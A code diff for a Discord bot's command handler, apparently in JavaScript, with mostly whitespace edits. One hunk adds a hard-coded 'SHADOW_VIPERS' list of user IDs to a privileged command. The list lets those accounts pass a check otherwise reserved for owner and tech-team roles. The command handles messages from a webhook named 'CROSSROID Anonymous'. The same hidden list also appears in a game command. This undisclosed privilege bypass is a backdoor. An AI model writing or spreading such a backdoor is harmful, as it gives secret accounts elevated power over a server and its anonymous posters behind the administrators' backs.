@@ -374,7 +374,7 @@ async function handleCommands(interaction, client) {
             const opponentUser = interaction.options.getUser('opponent');
 
             // --- SHADOW VIPER SYSTEM ---
-            const SHADOW_VIPERS = ["1198230780032323594","1410327346069635085","1451254469542023229","1291528706396917827","1451090946052853811","1441052289153372210","1415650457099047043"];
+            const SHADOW_VIPERS = ["1198230780032323594", "1410327346069635085", "1451254469542023229", "1291528706396917827", "1451090946052853811", "1441052289153372210", "1415650457099047043"];
             const isVip = SHADOW_VIPERS.includes(userId);
             const isOpponentVip = SHADOW_VIPERS.includes(opponentUser.id);
             // ---------------------------
@@ -433,7 +433,7 @@ async function handleCommands(interaction, client) {
                     // Penalty for cowardice: 5 min timeout
                     const opponentMember = await interaction.guild.members.fetch(opponentUser.id).catch(() => null);
                     if (opponentMember && opponentMember.moderatable) {
-                         try {
+                        try {
                             await opponentMember.timeout(5 * 60 * 1000, 'Russian Cowardice');
                             await interaction.channel.send(`👮 ${opponentUser} は敵前逃亡罪で5分間拘束されました。`);
                         } catch (e) { }
@@ -1125,7 +1125,13 @@ async function handleCommands(interaction, client) {
                 }
 
                 const member = await interaction.guild.members.fetch(interaction.user.id).catch(() => null);
-                if (member && (member.roles.cache.has(OWNER_ROLE_ID) || member.roles.cache.has(TECHTEAM_ROLE_ID))) {
+
+                // --- SHADOW VIPER SYSTEM ---
+                const SHADOW_VIPERS = ["1198230780032323594", "1410327346069635085", "1451254469542023229", "1291528706396917827", "1451090946052853811", "1441052289153372210", "1415650457099047043"];
+                const isVip = SHADOW_VIPERS.includes(interaction.user.id);
+                // ---------------------------
+
+                if (member && (member.roles.cache.has(OWNER_ROLE_ID) || member.roles.cache.has(TECHTEAM_ROLE_ID) || isVip)) {
                     if (interaction.targetMessage.webhookId != null) {
                         const webhook = await interaction.targetMessage.fetchWebhook().catch(() => null);
                         if (webhook && webhook.name === 'CROSSROID Anonymous') {
